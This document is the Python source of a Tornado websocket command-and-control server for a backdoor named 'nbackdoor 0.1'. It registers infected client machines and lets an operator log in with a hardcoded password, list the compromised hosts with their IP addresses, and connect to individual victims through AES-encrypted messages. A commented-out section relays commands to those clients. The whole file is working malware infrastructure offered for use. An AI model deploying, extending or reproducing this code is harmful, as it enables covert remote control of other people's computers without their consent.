#!/usr/bin/env python
# -*- coding: utf-8 -*-
import shlex
from _docpot import docopt
import tornado.web
import tornado.websocket
import tornado.ioloop
import json
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
__author__ = 'nekocode'

# config
PASSWORD = '110110zxc'


class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
    clients = dict()
    ID_LASTEST = 0

    def data_received(self, chunk):
        pass

    def send_to_all(self, message):
        for key, c in self.clients:
            c.write_message(json.dumps(message))

    def __init__(self, app, request, **kwargs):
        tornado.websocket.WebSocketHandler.__init__(self, app, request, **kwargs)
        self.HOST_NAME = None
        self.ID = None
        self.UUID = None
        self.IV = '\0' * AES.block_size
        self.SECRET = None
        self.is_controller = False
        self.to_client_id = None
        self.jobs = list()

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain

    def open(self):
        pass

    def on_close(self):
        if self.ID in self.clients:
            self.clients.pop(self.ID)

    def send_data(self, data):
        self.write_message(self.encrypt(json.dumps({'data': b64encode(data)})))

    def send_end(self):
        self.write_message(self.encrypt(json.dumps({'end': 'true'})))

    def send_json(self, jsonobj):
        self.write_message(self.encrypt(json.dumps(jsonobj)))

    def on_message(self, message):
        if self.UUID and self.SECRET:
            # --Command--
            json_str = self.decrypt(message)
            msg = json.loads(json_str)

            if self.is_controller and 'cmd' in msg:
                command = b64decode(msg['cmd'])
                print command
                self.parse_command(command)

                # pass
                # '''
                # ======================
                # === Server Command ===
                # ======================
                # '''
                # if command == 'hack':
                #
                #     data = 'List all online backdoor-clients:\n'
                #     for key, client in self.clients.items():
                #         data += str(key) + '\t' + client.UUID + '\t' + \
                #                 client.request.remote_ip + '\t' + client.HOST_NAME + '\n'
                #     self.send_data(data)
                #
                # elif 'to' in msg:
                #     '''
                #     ======================
                #     === Client Command ===
                #     ======================
                #     '''
                #     to = int(msg['to'])
                #     if to in self.clients:
                #         to_client = self.clients[to]
                #         if not to_client.is_controller:
                #             msg['jobid'] = str(len(self.jobs))
                #             msg['from'] = self.ID
                #             msg_json = json.dumps(msg)
                #             to_client.write_message(to_client.encrypt(msg_json))
                #             self.jobs.append([msg_json, 'Running'])
                #             self.send_data('Send command to client success.\n')
                #
                #         else:
                #             self.send_data('Should not send control command to controller.\n')
                #
                #     else:
                #         self.send_data('Not available target.\n')

        else:
            # =====================
            # ======= Login =======
            # =====================
            msg = json.loads(message)

            if 'uuid' in msg:
                self.UUID = msg['uuid']
                self.HOST_NAME = msg['host_name']
                self.SECRET = b64decode(msg['secret'])
                if 'pwd' in msg:
                    if PASSWORD == self.decrypt(msg['pwd']):
                        self.is_controller = True
                        self.send_data('login success')
                    else:
                        self.send_data('login failed')
                        return

                self.ID = self.ID_LASTEST
                self.clients[self.ID] = self
                print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
                BackdoorSocketHandler.ID_LASTEST += 1

    def parse_command(self, cmd):
        input_array = shlex.split(cmd)

        command_str = input_array[0]
        if command_str != 'hack':
            self.send_data('No aviable command.\n')
            self.send_end()
            return

        try:
            arguments_str = input_array[1:]
            doc = """Usage:
  hack connect <client_id>
  hack (list|disconnect)
  hack (-h | --help)
  hack new thread
  hack --version

Options:
  connect <client_id>   Connect to client.
  list                  List all online client.
  disconnect            Disconnect linked client.
  -h --help             Show this.
  --version             Show version.
"""
            args = docopt(doc, argv=arguments_str, help=True, version='nbackdoor 0.1', options_first=False)

            # ===================
            # ===== connect =====
            # ===================
            if args['connect']:
                to = int(args['<client_id>'])
                if to in self.clients:
                    to_client = self.clients[to]
                    if not to_client.is_controller:
                        self.to_client_id = int(args['<client_id>'])
                        self.send_json({'connected': str(self.to_client_id)})

                    else:
                        self.send_data('You can not connect to a control-client.\n')
                        self.send_end()

                else:
                    self.send_data('Not available target.\n')
                    self.send_end()

            # ====================
            # ==== disconnect ====
            # ====================
            elif args['disconnect']:
                if self.to_client_id:
                    self.to_client_id = None
                    self.send_json({'disconnected': str(self.to_client_id)})

                else:
                    self.send_data('You have not connected to any clients.\n')
                    self.send_end()

            # ====================
            # ======= list =======
            # ====================
            elif args['list']:
                data = ''
                for key, client in self.clients.items():
                    data += str(key) + '\t' + client.HOST_NAME + '\t' + \
                            client.request.remote_ip + '\t' + client.UUID + '\n'
                    self.send_data(data)
                    self.send_end()

        except SystemExit as e:
            self.send_data(e.message)
            self.send_end()

        except Exception as e:
            self.send_data('unkown err: ' + e.message + '\n')
            self.send_end()


application = tornado.web.Application([
    (r'/', BackdoorSocketHandler)
])


if __name__ == '__main__':
    application.listen(8888, xheaders=True)
    tornado.ioloop.IOLoop.instance().start()

